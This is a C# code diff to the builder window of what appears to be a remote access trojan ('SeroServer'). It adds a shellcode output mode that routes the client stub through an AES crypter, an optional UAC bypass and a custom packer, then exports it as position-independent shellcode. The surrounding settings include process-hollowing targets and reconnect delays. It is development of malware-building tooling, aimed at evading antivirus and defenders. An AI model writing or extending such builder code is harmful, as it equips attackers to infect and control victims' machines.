@@ -3138,6 +3138,11 @@ public partial class ServerWindow : ThemedWindow
             if (cfg.TryGetValue("HollowTarget", out var ht)) BldHollowTarget.Text = ht;
             if (cfg.TryGetValue("Encrypt", out v)) BldEncrypt.IsChecked = v == "1";
             if (cfg.TryGetValue("UacBypass", out v)) BldUacBypass.IsChecked = v == "1";
+            if (!SeroServer.Builder.CrypterBuilder.IsAvailable)
+            {
+                BldEncrypt.IsChecked = false; BldEncrypt.IsEnabled = false;
+                BldUacBypass.IsChecked = false; BldUacBypass.IsEnabled = false;
+            }
 
             // Reconnect
             if (cfg.TryGetValue("ReconnectDelay", out var rd)) BldReconnectDelay.Text = rd;
@@ -4120,9 +4125,11 @@ Read-Host 'Press Enter to close'
             }
         }
 
+        bool shellcodeDialogMode = BldShellcode.IsChecked == true;
         var dialogBuild = new Microsoft.Win32.SaveFileDialog
         {
-            Filter = "Executable (*.exe)|*.exe",
+            Filter = shellcodeDialogMode ? "Shellcode (*.bin)|*.bin" : "Executable (*.exe)|*.exe",
+            DefaultExt = shellcodeDialogMode ? ".bin" : ".exe",
             FileName = string.Empty,
             Title = "Save built client"
         };
@@ -4368,7 +4375,13 @@ Read-Host 'Press Enter to close'
                 }
             }
 
-            File.Copy(builtExe, outputExe, true);
+            // Shellcode mode: build to temp — don't save stub.exe to the output path
+            bool shellcodeMode = BldShellcode.IsChecked == true;
+            string workingExe = shellcodeMode
+                ? Path.Combine(Path.GetTempPath(), "sero_sc_" + Guid.NewGuid().ToString("N")[..8] + ".exe")
+                : outputExe;
+
+            File.Copy(builtExe, workingExe, true);
             try { Directory.Delete(tempOut, true); } catch { }
 
             // icon + metadata used by both crypter and custom packer
@@ -4389,7 +4402,7 @@ Read-Host 'Press Enter to close'
                 TxtBuildStatus.Text = Lang.Get("BLD_STATUS_CRYPTER");
                 Log("[*] Builder: Applying AES crypter...");
 
-                await SeroServer.Builder.CrypterBuilder.ApplyAsync(outputExe, Log, iconForLoader, meta, uacBypass);
+                await SeroServer.Builder.CrypterBuilder.ApplyAsync(workingExe, Log, iconForLoader, meta, uacBypass);
             }
 
             // Custom packer — stacks on top of crypter (or wraps raw stub if no crypter)
@@ -4397,29 +4410,17 @@ Read-Host 'Press Enter to close'
             {
                 TxtBuildStatus.Text = Lang.Get("BLD_STATUS_PACKER");
                 Log("[*] Builder: Applying custom packer...");
-                await SeroServer.Builder.CustomPackerBuilder.ApplyAsync(outputExe, Log, iconForLoader, meta);
+                await SeroServer.Builder.CustomPackerBuilder.ApplyAsync(workingExe, Log, iconForLoader, meta);
             }
 
-
-            var size = new FileInfo(outputExe).Length;
-            var sizeStr = size < 1024 * 1024
-                ? $"{size / 1024.0:F0} KB"
-                : $"{size / (1024.0 * 1024.0):F1} MB";
-            Log($"[+] Builder: {Path.GetFileName(outputExe)} ({size:N0} bytes) saved.");
-            TxtBuildStatus.Text = $"Built: {Path.GetFileName(outputExe)} ({sizeStr})";
-            SetStatus("Build successful.");
-            NotificationService.NotifyBuildSuccess();
-
-            ShowBuildResult(Path.GetFileName(outputExe), sizeStr);
-
-            // ── Shellcode target (independent compile path, no file dialog) ─────
-            if (BldShellcode.IsChecked == true)
+            if (shellcodeMode)
             {
+                // ── Shellcode output: generate .bin only, discard temp exe ─────────────
                 TxtBuildStatus.Text = Lang.Get("SC_STATUS_GEN");
                 Log("[*] Shellcode: Compiling position-independent binary...");
                 try
                 {
-                    var blob = await SeroServer.Builder.ShellcodeExport.BuildAsync(outputExe, Log);
+                    var blob = await SeroServer.Builder.ShellcodeExport.BuildAsync(workingExe, Log);
                     if (blob == null)
                     {
                         TxtBuildStatus.Text = Lang.Get("SC_STATUS_FAILED");
@@ -4433,6 +4434,8 @@ Read-Host 'Press Enter to close'
                             : $"{blob.Length / (1024.0 * 1024.0):F1} MB";
                         Log($"[+] Shellcode: shellcode.bin ({blob.Length:N0} bytes) → {Path.GetDirectoryName(scPath)}");
                         TxtBuildStatus.Text = $"Shellcode: shellcode.bin ({scSize})";
+                        SetStatus("Build successful.");
+                        NotificationService.NotifyBuildSuccess();
                     }
                 }
                 catch (Exception scEx)
@@ -4440,6 +4443,22 @@ Read-Host 'Press Enter to close'
                     Log($"[!] Shellcode: {scEx.Message}");
                     TxtBuildStatus.Text = $"Error: {scEx.Message}";
                 }
+                finally
+                {
+                    try { File.Delete(workingExe); } catch { }
+                }
+            }
+            else
+            {
+                var size = new FileInfo(workingExe).Length;
+                var sizeStr = size < 1024 * 1024
+                    ? $"{size / 1024.0:F0} KB"
+                    : $"{size / (1024.0 * 1024.0):F1} MB";
+                Log($"[+] Builder: {Path.GetFileName(workingExe)} ({size:N0} bytes) saved.");
+                TxtBuildStatus.Text = $"Built: {Path.GetFileName(workingExe)} ({sizeStr})";
+                SetStatus("Build successful.");
+                NotificationService.NotifyBuildSuccess();
+                ShowBuildResult(Path.GetFileName(workingExe), sizeStr);
             }
         }
         catch (Exception ex)
@@ -7961,7 +7980,13 @@ Read-Host 'Press Enter to close'
 
         // Hide accent palette for themes with a fixed accent (Seven Classic, Windows XP).
         if (AccentSection != null)
-            AccentSection.Visibility = (name == "Seven" || name == "WindowsXP") ? Visibility.Collapsed : Visibility.Visible;    }
+            AccentSection.Visibility = (name == "Seven" || name == "WindowsXP") ? Visibility.Collapsed : Visibility.Visible;
+
+        // Context menu icon tint: white on dark themes, near-black on light themes
+        res["CtxIconColor"] = _lightThemeKeys.Contains(name)
+            ? System.Windows.Media.Color.FromRgb(0x20, 0x20, 0x20)
+            : System.Windows.Media.Colors.White;
+    }
 
     private void ApplyStoredTheme()
     {
